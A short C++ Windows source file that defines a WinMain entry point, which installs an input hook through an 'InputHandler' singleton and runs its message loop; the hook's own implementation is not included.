#pragma comment( lib, "user32.lib" )

#include <Windows.h>
#include <iostream>
#include <fstream>
#include <thread>	

#include "InputHandler.h"


InputHandler ih;


int WINAPI WinMain(HINSTANCE, HINSTANCE, LPSTR, int)
{
	InputHandler::Instance().InstallHook();
	InputHandler::Instance().Messsages();
	return 1;
}